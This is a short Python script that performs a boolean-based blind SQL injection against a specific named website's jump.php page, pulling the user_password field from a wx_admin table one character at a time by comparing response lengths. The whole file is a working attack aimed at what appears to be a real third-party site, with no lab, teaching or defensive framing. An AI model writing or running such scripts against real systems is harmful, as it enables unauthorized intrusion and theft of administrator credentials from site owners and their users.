#!/usr/bin/python3
#coding=utf-8

import requests
def main():
    length = 1255
    from1 = 1
    to1 = 32
    from2 = 48
    to2 = 122
    res = ''
    for i in range(from1,to1+1):
        for j in range(from2, to2):
          url = "http://www.uchuang.cc/jump.php?" \
                "id=1115%27%20and%20ord(mid(((select(user_password)%20from%20wx_admin)" \
                "),"+str(i)+",1))="+str(j)+"%23"
          r = requests.get(url)
          #print(len(r.content))
          if len(r.content) == length:
              res = res + chr(j)
              print(res)
              break

if __name__ == '__main__':
    main()